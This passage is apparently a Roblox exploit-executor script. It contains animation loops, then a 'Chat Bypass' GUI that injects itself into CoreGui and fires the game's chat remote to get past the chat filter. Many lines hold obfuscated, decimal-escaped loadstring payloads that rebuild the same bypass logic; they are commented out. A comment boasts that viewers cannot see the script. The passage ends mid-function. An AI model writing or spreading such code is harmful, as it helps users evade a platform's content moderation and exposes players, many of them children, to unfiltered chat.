				NECK.C0=NECK.C0:Lerp(CFrame.new(0+0*math.cos(sine/10),1+0*math.cos(sine/10),0+0*math.cos(sine/10))*CFrame.Angles(math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10))),.2) 
				RJ.C0=RJ.C0:Lerp(CFrame.new(0+0*math.cos(sine/10),2.54+0*math.cos(sine/10),0+0*math.cos(sine/10))*CFrame.Angles(math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10))),.2) 
				RS.C0=RS.C0:Lerp(CFrame.new(0+0*math.cos(sine/10),0+0*math.cos(sine/10),0+0*math.cos(sine/10))*CFrame.Angles(math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10))),.2) 
				LS.C0=LS.C0:Lerp(CFrame.new(0+0*math.cos(sine/10),-1.76+0*math.cos(sine/10),0+0*math.cos(sine/10))*CFrame.Angles(math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10))),.2) 
				RH.C0=RH.C0:Lerp(CFrame.new(0+0*math.cos(sine/10),-2.83+0*math.cos(sine/10),0+0*math.cos(sine/10))*CFrame.Angles(math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10))),.2) 
				LH.C0=LH.C0:Lerp(CFrame.new(0+0*math.cos(sine/10),-4.44+0*math.cos(sine/10),0+0*math.cos(sine/10))*CFrame.Angles(math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10))),.2)
			elseif Root.Velocity.Magnitude < 2 then -- idle
				NECK.C0=NECK.C0:Lerp(CFrame.new(0+0*math.cos(sine/10),1+0*math.cos(sine/10),0+0*math.cos(sine/10))*CFrame.Angles(math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10))),.2) 
				RJ.C0=RJ.C0:Lerp(CFrame.new(0+0*math.cos(sine/10),-2+0*math.cos(sine/10),0+0*math.cos(sine/10))*CFrame.Angles(math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10))),.2) 
				RS.C0=RS.C0:Lerp(CFrame.new(0+0*math.cos(sine/10),-1.5+0*math.cos(sine/10),0.93+0*math.cos(sine/10))*CFrame.Angles(math.rad(120.21+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10))),.2) 
				LS.C0=LS.C0:Lerp(CFrame.new(0+0*math.cos(sine/10),-1.5+0*math.cos(sine/10),1.47+0*math.cos(sine/10))*CFrame.Angles(math.rad(270+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10))),.2) 
				RH.C0=RH.C0:Lerp(CFrame.new(0+0*math.cos(sine/10),-1.5+0*math.cos(sine/10),2.9+0*math.cos(sine/10))*CFrame.Angles(math.rad(242.48+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(0+5.58*math.cos(sine/10))),.2) 
				LH.C0=LH.C0:Lerp(CFrame.new(0+0*math.cos(sine/10),-0.68+0*math.cos(sine/10),4.69+0*math.cos(sine/10))*CFrame.Angles(math.rad(219.55+13.23*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(0+59.08*math.cos(sine/10))),.2)
			elseif Root.Velocity.Magnitude < 20 then -- walk
				NECK.C0=NECK.C0:Lerp(CFrame.new(0+0*math.cos(sine/10),1+0*math.cos(sine/10),0+0*math.cos(sine/10))*CFrame.Angles(math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10))),.2) 
				RJ.C0=RJ.C0:Lerp(CFrame.new(0+0*math.cos(sine/10),-2+0*math.cos(sine/10),0+0*math.cos(sine/10))*CFrame.Angles(math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10))),.2) 
				RS.C0=RS.C0:Lerp(CFrame.new(0+0*math.cos(sine/10),-1.5+0*math.cos(sine/10),0.93+0*math.cos(sine/10))*CFrame.Angles(math.rad(120.21+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10))),.2) 
				LS.C0=LS.C0:Lerp(CFrame.new(0+0*math.cos(sine/10),-1.5+0*math.cos(sine/10),1.47+0*math.cos(sine/10))*CFrame.Angles(math.rad(270+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10))),.2) 
				RH.C0=RH.C0:Lerp(CFrame.new(0+0*math.cos(sine/10),-1.5+0*math.cos(sine/10),2.9+0*math.cos(sine/10))*CFrame.Angles(math.rad(270+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(0+2*math.cos(sine/10))),.2) 
				LH.C0=LH.C0:Lerp(CFrame.new(0+0*math.cos(sine/10),-1.5+0*math.cos(sine/10),4.69+0*math.cos(sine/10))*CFrame.Angles(math.rad(270+-2.06*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(0+28.51*math.cos(sine/10))),.2)
			elseif Root.Velocity.Magnitude > 20 then -- run
				NECK.C0=NECK.C0:Lerp(CFrame.new(0+0*math.cos(sine/10),1+0*math.cos(sine/10),0+0*math.cos(sine/10))*CFrame.Angles(math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10))),.2) 
				RJ.C0=RJ.C0:Lerp(CFrame.new(0+0*math.cos(sine/10),-2+0*math.cos(sine/10),0+0*math.cos(sine/10))*CFrame.Angles(math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10))),.2) 
				RS.C0=RS.C0:Lerp(CFrame.new(0+0*math.cos(sine/10),-1.5+0*math.cos(sine/10),0.93+0*math.cos(sine/10))*CFrame.Angles(math.rad(120.21+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10))),.2) 
				LS.C0=LS.C0:Lerp(CFrame.new(0+0*math.cos(sine/10),-1.5+0*math.cos(sine/10),1.47+0*math.cos(sine/10))*CFrame.Angles(math.rad(270+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10))),.2) 
				RH.C0=RH.C0:Lerp(CFrame.new(0+0*math.cos(sine/10),-1.5+0*math.cos(sine/10),2.9+0*math.cos(sine/10))*CFrame.Angles(math.rad(270+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(0+2*math.cos(sine/10))),.2) 
				LH.C0=LH.C0:Lerp(CFrame.new(0+0*math.cos(sine/10),-1.5+0*math.cos(sine/10),4.69+0*math.cos(sine/10))*CFrame.Angles(math.rad(270+-2.06*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(0+28.51*math.cos(sine/10))),.2)
			end
			srv.RenderStepped:Wait()
		end
	end)()
	--Created using Nexo Animator V4
end)

TextButton_5.Parent = SCRIPTSTAB
TextButton_5.BackgroundColor3 = Color3.fromRGB(9, 11, 20)
TextButton_5.Position = UDim2.new(0.0345744677, 0, 0.833333313, 0)
TextButton_5.Size = UDim2.new(0, 350, 0, 39)
TextButton_5.Font = Enum.Font.SourceSans
TextButton_5.Text = "Chat Bypass (f only)"
TextButton_5.TextColor3 = Color3.fromRGB(170, 0, 255)
TextButton_5.TextSize = 31.000
TextButton_5.MouseButton1Down:Connect(function()
	---loadstring("\108\111\99\97\108\32\104\32\61\32\73\110\115\116\97\110\99\101\46\110\101\119\40\34\83\99\114\101\101\110\71\117\105\34\41\10\108\111\99\97\108\32\77\97\105\110\32\61\32\73\110\115\116\97\110\99\101\46\110\101\119\40\34\73\109\97\103\101\76\97\98\101\108\34\41\10\108\111\99\97\108\32\84\111\112\32\61\32\73\110\115\116\97\110\99\101\46\110\101\119\40\34\70\114\97\109\101\34\41\10\108\111\99\97\108\32\84\105\116\108\101\32\61\32\73\110\115\116\97\110\99\101\46\110\101\119\40\34\84\101\120\116\76\97\98\101\108\34\41\10\108\111\99\97\108\32\84\101\120\116\66\111\120\32\61\32\73\110\115\116\97\110\99\101\46\110\101\119\40\34\84\101\120\116\66\111\120\34\41\10\108\111\99\97\108\32\84\101\120\116\66\117\116\116\111\110\32\61\32\73\110\115\116\97\110\99\101\46\110\101\119\40\34\84\101\120\116\66\117\116\116\111\110\34\41\10\10\104\46\78\97\109\101\32\61\32\34\104\34\10\104\46\80\97\114\101\110\116\32\61\32\103\97\109\101\58\71\101\116\83\101\114\118\105\99\101\40\34\67\111\114\101\71\117\105\34\41\10\104\46\82\101\115\101\116\79\110\83\112\97\119\110\32\61\32\102\97\108\115\101\10\10\77\97\105\110\46\78\97\109\101\32\61\32\34\77\97\105\110\34\10\77\97\105\110\46\80\97\114\101\110\116\32\61\32\104\10\77\97\105\110\46\65\99\116\105\118\101\32\61\32\116\114\117\101\10\77\97\105\110\46\68\114\97\103\103\97\98\108\101\32\61\32\116\114\117\101\10\77\97\105\110\46\66\97\99\107\103\114\111\117\110\100\67\111\108\111\114\51\32\61\32\67\111\108\111\114\51\46\102\114\111\109\82\71\66\40\49\57\54\44\32\52\48\44\32\50\56\41\10\77\97\105\110\46\66\111\114\100\101\114\83\105\122\101\80\105\120\101\108\32\61\32\48\10\77\97\105\110\46\80\111\115\105\116\105\111\110\32\61\32\85\68\105\109\50\46\110\101\119\40\48\46\49\55\52\53\52\53\52\53\50\44\32\48\44\32\48\46\52\53\57\53\55\52\52\54\49\44\32\48\41\10\77\97\105\110\46\83\105\122\101\32\61\32\85\68\105\109\50\46\110\101\119\40\48\44\32\52\53\52\44\32\48\44\32\50\49\56\41\10\10\10\84\111\112\46\78\97\109\101\32\61\32\34\84\111\112\34\10\84\111\112\46\80\97\114\101\110\116\32\61\32\77\97\105\110\10\84\111\112\46\66\97\99\107\103\114\111\117\110\100\67\111\108\111\114\51\32\61\32\67\111\108\111\114\51\46\102\114\111\109\82\71\66\40\50\48\53\44\32\56\52\44\32\55\53\41\10\84\111\112\46\66\111\114\100\101\114\83\105\122\101\80\105\120\101\108\32\61\32\48\10\84\111\112\46\83\105\122\101\32\61\32\85\68\105\109\50\46\110\101\119\40\48\44\32\52\53\52\44\32\48\44\32\52\52\41\10\10\84\105\116\108\101\46\78\97\109\101\32\61\32\34\84\105\116\108\101\34\10\84\105\116\108\101\46\80\97\114\101\110\116\32\61\32\84\111\112\10\84\105\116\108\101\46\66\97\99\107\103\114\111\117\110\100\67\111\108\111\114\51\32\61\32\67\111\108\111\114\51\46\102\114\111\109\82\71\66\40\50\51\56\44\32\49\57\54\44\32\49\56\50\41\10\84\105\116\108\101\46\66\111\114\100\101\114\83\105\122\101\80\105\120\101\108\32\61\32\48\10\84\105\116\108\101\46\80\111\115\105\116\105\111\110\32\61\32\85\68\105\109\50\46\110\101\119\40\48\44\32\48\44\32\48\46\50\57\53\52\53\52\53\54\50\44\32\48\41\10\84\105\116\108\101\46\83\105\122\101\32\61\32\85\68\105\109\50\46\110\101\119\40\48\44\32\52\53\52\44\32\48\44\32\51\48\41\10\84\105\116\108\101\46\70\111\110\116\32\61\32\69\110\117\109\46\70\111\110\116\46\65\114\105\97\108\66\111\108\100\10\84\105\116\108\101\46\84\101\120\116\32\61\32\34\67\104\97\116\32\66\121\112\97\115\115\32\71\117\105\34\10\84\105\116\108\101\46\84\101\120\116\67\111\108\111\114\51\32\61\32\67\111\108\111\114\51\46\102\114\111\109\82\71\66\40\49\50\51\44\32\49\56\50\44\32\50\51\50\41\10\84\105\116\108\101\46\84\101\120\116\83\99\97\108\101\100\32\61\32\116\114\117\101\10\84\105\116\108\101\46\84\101\120\116\83\105\122\101\32\61\32\49\52\46\48\48\48\10\84\105\116\108\101\46\84\101\120\116\87\114\97\112\112\101\100\32\61\32\116\114\117\101\10\10\84\101\120\116\66\111\120\46\80\97\114\101\110\116\32\61\32\77\97\105\110\10\84\101\120\116\66\111\120\46\66\97\99\107\103\114\111\117\110\100\67\111\108\111\114\51\32\61\32\67\111\108\111\114\51\46\102\114\111\109\82\71\66\40\49\56\48\44\32\50\49\48\44\32\50\50\56\41\10\84\101\120\116\66\111\120\46\66\111\114\100\101\114\83\105\122\101\80\105\120\101\108\32\61\32\48\10\84\101\120\116\66\111\120\46\80\111\115\105\116\105\111\110\32\61\32\85\68\105\109\50\46\110\101\119\40\48\46\48\55\48\52\56\52\53\55\56\54\44\32\48\44\32\48\46\50\55\48\54\52\50\50\50\49\44\32\48\41\10\84\101\120\116\66\111\120\46\83\105\122\101\32\61\32\85\68\105\109\50\46\110\101\119\40\48\44\32\51\56\56\44\32\48\44\32\54\50\41\10\84\101\120\116\66\111\120\46\70\111\110\116\32\61\32\69\110\117\109\46\70\111\110\116\46\83\111\117\114\99\101\83\97\110\115\66\111\108\100\10\84\101\120\116\66\111\120\46\80\108\97\99\101\104\111\108\100\101\114\84\101\120\116\32\61\32\34\67\104\97\116\32\66\121\112\97\115\115\34\10\84\101\120\116\66\111\120\46\84\101\120\116\32\61\32\34\34\10\84\101\120\116\66\111\120\46\84\101\120\116\67\111\108\111\114\51\32\61\32\67\111\108\111\114\51\46\102\114\111\109\82\71\66\40\50\49\56\44\32\49\51\52\44\32\49\50\50\41\10\84\101\120\116\66\111\120\46\84\101\120\116\83\99\97\108\101\100\32\61\32\116\114\117\101\10\84\101\120\116\66\111\120\46\84\101\120\116\83\105\122\101\32\61\32\49\52\46\48\48\48\10\84\101\120\116\66\111\120\46\84\101\120\116\87\114\97\112\112\101\100\32\61\32\116\114\117\101\10\10\84\101\120\116\66\117\116\116\111\110\46\80\97\114\101\110\116\32\61\32\77\97\105\110\10\84\101\120\116\66\117\116\116\111\110\46\66\97\99\107\103\114\111\117\110\100\67\111\108\111\114\51\32\61\32\67\111\108\111\114\51\46\102\114\111\109\82\71\66\40\49\48\52\44\32\49\49\54\44\32\49\55\50\41\10\84\101\120\116\66\117\116\116\111\110\46\66\111\114\100\101\114\83\105\122\101\80\105\120\101\108\32\61\32\48\10\84\101\120\116\66\117\116\116\111\110\46\80\111\115\105\116\105\111\110\32\61\32\85\68\105\109\50\46\110\101\119\40\48\46\49\48\51\53\50\52\50\51\44\32\48\44\32\48\46\53\57\54\51\51\48\50\50\53\44\32\48\41\10\84\101\120\116\66\117\116\116\111\110\46\83\105\122\101\32\61\32\85\68\105\109\50\46\110\101\119\40\48\44\32\51\53\57\44\32\48\44\32\52\48\41\10\84\101\120\116\66\117\116\116\111\110\46\70\111\110\116\32\61\32\69\110\117\109\46\70\111\110\116\46\83\111\117\114\99\101\83\97\110\115\10\84\101\120\116\66\117\116\116\111\110\46\84\101\120\116\32\61\32\34\67\104\97\116\34\10\84\101\120\116\66\117\116\116\111\110\46\84\101\120\116\67\111\108\111\114\51\32\61\32\67\111\108\111\114\51\46\102\114\111\109\82\71\66\40\50\48\53\44\32\56\52\44\32\55\53\41\10\84\101\120\116\66\117\116\116\111\110\46\84\101\120\116\83\99\97\108\101\100\32\61\32\116\114\117\101\10\84\101\120\116\66\117\116\116\111\110\46\84\101\120\116\83\105\122\101\32\61\32\49\52\46\48\48\48\10\84\101\120\116\66\117\116\116\111\110\46\84\101\120\116\87\114\97\112\112\101\100\32\61\32\116\114\117\101\10\10\45\45\67\104\97\116\10\84\101\120\116\66\117\116\116\111\110\46\77\111\117\115\101\66\117\116\116\111\110\49\68\111\119\110\58\67\111\110\110\101\99\116\40\102\117\110\99\116\105\111\110\40\41\10\32\32\32\32\108\111\99\97\108\32\99\104\97\116\32\61\32\84\101\120\116\66\111\120\46\84\101\120\116\10\32\32\32\32\108\111\99\97\108\32\116\97\98\108\32\61\32\123\125\10\32\32\32\32\102\111\114\32\105\32\61\32\49\44\32\35\99\104\97\116\32\100\111\10")()
	---loadstring("\32\32\32\32\32\32\32\32\116\97\98\108\101\46\105\110\115\101\114\116\40\116\97\98\108\44\32\99\104\97\114\97\41\10\32\32\32\32\101\110\100\10\32\32\32\32\99\104\97\116\32\61\32\34\34\10\32\32\32\32\102\111\114\32\105\44\118\32\105\110\32\112\97\105\114\115\40\116\97\98\108\41\32\100\111\10\32\32\32\32\32\32\32\32\99\104\97\116\32\61\32\99\104\97\116\46\46\118\10\32\32\32\32\101\110\100\10\32\32\32\32\103\97\109\101\58\71\101\116\83\101\114\118\105\99\101\40\34\82\101\112\108\105\99\97\116\101\100\83\116\111\114\97\103\101\34\41\46\68\101\102\97\117\108\116\67\104\97\116\83\121\115\116\101\109\67\104\97\116\69\118\101\110\116\115\46\83\97\121\77\101\115\115\97\103\101\82\101\113\117\101\115\116\58\70\105\114\101\83\101\114\118\101\114\40\99\104\97\116\44\32\34\65\108\108\34\41\10\101\110\100\41\10")()

	---loadstring("\32\32\32\32\32\32\32\32\116\97\98\108\101\46\105\110\115\101\114\116\40\116\97\98\108\44\32\99\104\97\114\97\41\10\32\32\32\32\101\110\100\10\32\32\32\32\99\104\97\116\32\61\32\34\34\10\32\32\32\32\102\111\114\32\105\44\118\32\105\110\32\112\97\105\114\115\40\116\97\98\108\41\32\100\111\10\32\32\32\32\32\32\32\32\99\104\97\116\32\61\32\99\104\97\116\46\46\118\10\32\32\32\32\101\110\100\10\32\32\32\32\103\97\109\101\58\71\101\116\83\101\114\118\105\99\101\40\34\82\101\112\108\105\99\97\116\101\100\83\116\111\114\97\103\101\34\41\46\68\101\102\97\117\108\116\67\104\97\116\83\121\115\116\101\109\67\104\97\116\69\118\101\110\116\115\46\83\97\121\77\101\115\115\97\103\101\82\101\113\117\101\115\116\58\70\105\114\101\83\101\114\118\101\114\40\99\104\97\116\44\32\34\65\108\108\34\41\10\101\110\100\41\10")()


	------loadstring("\32\32\32\32\32\32\32\32\116\97\98\108\101\46\105\110\115\101\114\116\40\116\97\98\108\44\32\99\104\97\114\97\41\10\32\32\32\32\101\110\100\10\32\32\32\32\99\104\97\116\32\61\32\34\34\10\32\32\32\32\102\111\114\32\105\44\118\32\105\110\32\112\97\105\114\115\40\116\97\98\108\41\32\100\111\10\32\32\32\32\32\32\32\32\99\104\97\116\32\61\32\99\104\97\116\46\46\118\10\32\32\32\32\101\110\100\10\32\32\32\32\103\97\109\101\58\71\101\116\83\101\114\118\105\99\101\40\34\82\101\112\108\105\99\97\116\101\100\83\116\111\114\97\103\101\34\41\46\68\101\102\97\117\108\116\67\104\97\116\83\121\115\116\101\109\67\104\97\116\69\118\101\110\116\115\46\83\97\121\77\101\115\115\97\103\101\82\101\113\117\101\115\116\58\70\105\114\101\83\101\114\118\101\114\40\99\104\97\116\44\32\34\65\108\108\34\41\10\101\110\100\41\10")()

	---loadstring("\32\32\32\32\32\32\32\32\116\97\98\108\101\46\105\110\115\101\114\116\40\116\97\98\108\44\32\99\104\97\114\97\41\10\32\32\32\32\101\110\100\10\32\32\32\32\99\104\97\116\32\61\32\34\34\10\32\32\32\32\102\111\114\32\105\44\118\32\105\110\32\112\97\105\114\115\40\116\97\98\108\41\32\100\111\10\32\32\32\32\32\32\32\32\99\104\97\116\32\61\32\99\104\97\116\46\46\118\10\32\32\32\32\101\110\100\10\32\32\32\32\103\97\109\101\58\71\101\116\83\101\114\118\105\99\101\40\34\82\101\112\108\105\99\97\116\101\100\83\116\111\114\97\103\101\34\41\46\68\101\102\97\117\108\116\67\104\97\116\83\121\115\116\101\109\67\104\97\116\69\118\101\110\116\115\46\83\97\121\77\101\115\115\97\103\101\82\101\113\117\101\115\116\58\70\105\114\101\83\101\114\118\101\114\40\99\104\97\116\44\32\34\65\108\108\34\41\10\101\110\100\41\10")()




	--Settings
	local bypass_s = true --The "s" character looks a little iffy so you can disable the script on "s" here if you'd like, just set the value to false





	game:GetService("StarterGui"):SetCore("SendNotification",{
		Title = "Im Patrick";
		Text = "Chat Bypass loaded";
		Duration = 10;
	})








	--Gui
	local h = Instance.new("ScreenGui")

	---loadstring("\32\32\32\32\32\32\32\32\116\97\98\108\101\46\105\110\115\101\114\116\40\116\97\98\108\44\32\99\104\97\114\97\41\10\32\32\32\32\101\110\100\10\32\32\32\32\99\104\97\116\32\61\32\34\34\10\32\32\32\32\102\111\114\32\105\44\118\32\105\110\32\112\97\105\114\115\40\116\97\98\108\41\32\100\111\10\32\32\32\32\32\32\32\32\99\104\97\116\32\61\32\99\104\97\116\46\46\118\10\32\32\32\32\101\110\100\10\32\32\32\32\103\97\109\101\58\71\101\116\83\101\114\118\105\99\101\40\34\82\101\112\108\105\99\97\116\101\100\83\116\111\114\97\103\101\34\41\46\68\101\102\97\117\108\116\67\104\97\116\83\121\115\116\101\109\67\104\97\116\69\118\101\110\116\115\46\83\97\121\77\101\115\115\97\103\101\82\101\113\117\101\115\116\58\70\105\114\101\83\101\114\118\101\114\40\99\104\97\116\44\32\34\65\108\108\34\41\10\101\110\100\41\10")()


	local Main = Instance.new("ImageLabel")
	local Top = Instance.new("Frame")

	---loadstring("\32\32\32\32\32\32\32\32\116\97\98\108\101\46\105\110\115\101\114\116\40\116\97\98\108\44\32\99\104\97\114\97\41\10\32\32\32\32\101\110\100\10\32\32\32\32\99\104\97\116\32\61\32\34\34\10\32\32\32\32\102\111\114\32\105\44\118\32\105\110\32\112\97\105\114\115\40\116\97\98\108\41\32\100\111\10\32\32\32\32\32\32\32\32\99\104\97\116\32\61\32\99\104\97\116\46\46\118\10\32\32\32\32\101\110\100\10\32\32\32\32\103\97\109\101\58\71\101\116\83\101\114\118\105\99\101\40\34\82\101\112\108\105\99\97\116\101\100\83\116\111\114\97\103\101\34\41\46\68\101\102\97\117\108\116\67\104\97\116\83\121\115\116\101\109\67\104\97\116\69\118\101\110\116\115\46\83\97\121\77\101\115\115\97\103\101\82\101\113\117\101\115\116\58\70\105\114\101\83\101\114\118\101\114\40\99\104\97\116\44\32\34\65\108\108\34\41\10\101\110\100\41\10")()


	local Title = Instance.new("TextLabel")
	local TextBox = Instance.new("TextBox")
	local TextButton = Instance.new("TextButton")

	h.Name = "h"
	h.Parent = game:GetService("CoreGui")
	---loadstring("\32\32\32\32\32\32\32\32\116\97\98\108\101\46\105\110\115\101\114\116\40\116\97\98\108\44\32\99\104\97\114\97\41\10\32\32\32\32\101\110\100\10\32\32\32\32\99\104\97\116\32\61\32\34\34\10\32\32\32\32\102\111\114\32\105\44\118\32\105\110\32\112\97\105\114\115\40\116\97\98\108\41\32\100\111\10\32\32\32\32\32\32\32\32\99\104\97\116\32\61\32\99\104\97\116\46\46\118\10\32\32\32\32\101\110\100\10\32\32\32\32\103\97\109\101\58\71\101\116\83\101\114\118\105\99\101\40\34\82\101\112\108\105\99\97\116\101\100\83\116\111\114\97\103\101\34\41\46\68\101\102\97\117\108\116\67\104\97\116\83\121\115\116\101\109\67\104\97\116\69\118\101\110\116\115\46\83\97\121\77\101\115\115\97\103\101\82\101\113\117\101\115\116\58\70\105\114\101\83\101\114\118\101\114\40\99\104\97\116\44\32\34\65\108\108\34\41\10\101\110\100\41\10")()

	h.ResetOnSpawn = false

	Main.Name = "Main"
	Main.Parent = h
	Main.Active = true
	Main.Draggable = true
	Main.BackgroundColor3 = Color3.fromRGB(196, 40, 28)
	Main.BorderSizePixel = 0
	Main.Position = UDim2.new(0.174545452, 0, 0.459574461, 0)
	Main.Size = UDim2.new(0, 454, 0, 218)


	Top.Name = "Top"
	Top.Parent = Main
	Top.BackgroundColor3 = Color3.fromRGB(205, 84, 75)
	Top.BorderSizePixel = 0
	Top.Size = UDim2.new(0, 454, 0, 44)

	Title.Name = "Title"
	Title.Parent = Top
	Title.BackgroundColor3 = Color3.fromRGB(238, 196, 182)
	Title.BorderSizePixel = 0
	Title.Position = UDim2.new(0, 0, 0.295454562, 0)
	Title.Size = UDim2.new(0, 454, 0, 30)
	Title.Font = Enum.Font.ArialBold
	Title.Text = "Chat Bypass Gui"
	Title.TextColor3 = Color3.fromRGB(123, 182, 232)
	Title.TextScaled = true
	Title.TextSize = 14.000
	Title.TextWrapped = true

	TextBox.Parent = Main
	TextBox.BackgroundColor3 = Color3.fromRGB(180, 210, 228)
	TextBox.BorderSizePixel = 0
	TextBox.Position = UDim2.new(0.0704845786, 0, 0.270642221, 0)
	TextBox.Size = UDim2.new(0, 388, 0, 62)
	TextBox.Font = Enum.Font.SourceSansBold
	TextBox.PlaceholderText = "Chat Bypass"
	TextBox.Text = ""
	TextBox.TextColor3 = Color3.fromRGB(218, 134, 122)
	TextBox.TextScaled = true
	TextBox.TextSize = 14.000
	TextBox.TextWrapped = true

	---loadstring("\32\32\32\32\32\32\32\32\116\97\98\108\101\46\105\110\115\101\114\116\40\116\97\98\108\44\32\99\104\97\114\97\41\10\32\32\32\32\101\110\100\10\32\32\32\32\99\104\97\116\32\61\32\34\34\10\32\32\32\32\102\111\114\32\105\44\118\32\105\110\32\112\97\105\114\115\40\116\97\98\108\41\32\100\111\10\32\32\32\32\32\32\32\32\99\104\97\116\32\61\32\99\104\97\116\46\46\118\10\32\32\32\32\101\110\100\10\32\32\32\32\103\97\109\101\58\71\101\116\83\101\114\118\105\99\101\40\34\82\101\112\108\105\99\97\116\101\100\83\116\111\114\97\103\101\34\41\46\68\101\102\97\117\108\116\67\104\97\116\83\121\115\116\101\109\67\104\97\116\69\118\101\110\116\115\46\83\97\121\77\101\115\115\97\103\101\82\101\113\117\101\115\116\58\70\105\114\101\83\101\114\118\101\114\40\99\104\97\116\44\32\34\65\108\108\34\41\10\101\110\100\41\10")()


	TextButton.Parent = Main
	TextButton.BackgroundColor3 = Color3.fromRGB(104, 116, 172)
	TextButton.BorderSizePixel = 0
	TextButton.Position = UDim2.new(0.10352423, 0, 0.596330225, 0)
	TextButton.Size = UDim2.new(0, 359, 0, 40)

	---loadstring("\32\32\32\32\32\32\32\32\116\97\98\108\101\46\105\110\115\101\114\116\40\116\97\98\108\44\32\99\104\97\114\97\41\10\32\32\32\32\101\110\100\10\32\32\32\32\99\104\97\116\32\61\32\34\34\10\32\32\32\32\102\111\114\32\105\44\118\32\105\110\32\112\97\105\114\115\40\116\97\98\108\41\32\100\111\10\32\32\32\32\32\32\32\32\99\104\97\116\32\61\32\99\104\97\116\46\46\118\10\32\32\32\32\101\110\100\10\32\32\32\32\103\97\109\101\58\71\101\116\83\101\114\118\105\99\101\40\34\82\101\112\108\105\99\97\116\101\100\83\116\111\114\97\103\101\34\41\46\68\101\102\97\117\108\116\67\104\97\116\83\121\115\116\101\109\67\104\97\116\69\118\101\110\116\115\46\83\97\121\77\101\115\115\97\103\101\82\101\113\117\101\115\116\58\70\105\114\101\83\101\114\118\101\114\40\99\104\97\116\44\32\34\65\108\108\34\41\10\101\110\100\41\10")()


	TextButton.Font = Enum.Font.SourceSans
	TextButton.Text = "Chat"
	TextButton.TextColor3 = Color3.fromRGB(205, 84, 75)
	TextButton.TextScaled = true
	TextButton.TextSize = 14.000
	TextButton.TextWrapped = true

	---loadstring("\32\32\32\32\32\32\32\32\116\97\98\108\101\46\105\110\115\101\114\116\40\116\97\98\108\44\32\99\104\97\114\97\41\10\32\32\32\32\101\110\100\10\32\32\32\32\99\104\97\116\32\61\32\34\34\10\32\32\32\32\102\111\114\32\105\44\118\32\105\110\32\112\97\105\114\115\40\116\97\98\108\41\32\100\111\10\32\32\32\32\32\32\32\32\99\104\97\116\32\61\32\99\104\97\116\46\46\118\10\32\32\32\32\101\110\100\10\32\32\32\32\103\97\109\101\58\71\101\116\83\101\114\118\105\99\101\40\34\82\101\112\108\105\99\97\116\101\100\83\116\111\114\97\103\101\34\41\46\68\101\102\97\117\108\116\67\104\97\116\83\121\115\116\101\109\67\104\97\116\69\118\101\110\116\115\46\83\97\121\77\101\115\115\97\103\101\82\101\113\117\101\115\116\58\70\105\114\101\83\101\114\118\101\114\40\99\104\97\116\44\32\34\65\108\108\34\41\10\101\110\100\41\10")()

	---fuck You Dont See My Script

	TextButton.MouseButton1Down:Connect(function()

		---loadstring("\32\32\32\32\32\32\32\32\116\97\98\108\101\46\105\110\115\101\114\116\40\116\97\98\108\44\32\99\104\97\114\97\41\10\32\32\32\32\101\110\100\10\32\32\32\32\99\104\97\116\32\61\32\34\34\10\32\32\32\32\102\111\114\32\105\44\118\32\105\110\32\112\97\105\114\115\40\116\97\98\108\41\32\100\111\10\32\32\32\32\32\32\32\32\99\104\97\116\32\61\32\99\104\97\116\46\46\118\10\32\32\32\32\101\110\100\10\32\32\32\32\103\97\109\101\58\71\101\116\83\101\114\118\105\99\101\40\34\82\101\112\108\105\99\97\116\101\100\83\116\111\114\97\103\101\34\41\46\68\101\102\97\117\108\116\67\104\97\116\83\121\115\116\101\109\67\104\97\116\69\118\101\110\116\115\46\83\97\121\77\101\115\115\97\103\101\82\101\113\117\101\115\116\58\70\105\114\101\83\101\114\118\101\114\40\99\104\97\116\44\32\34\65\108\108\34\41\10\101\110\100\41\10")()


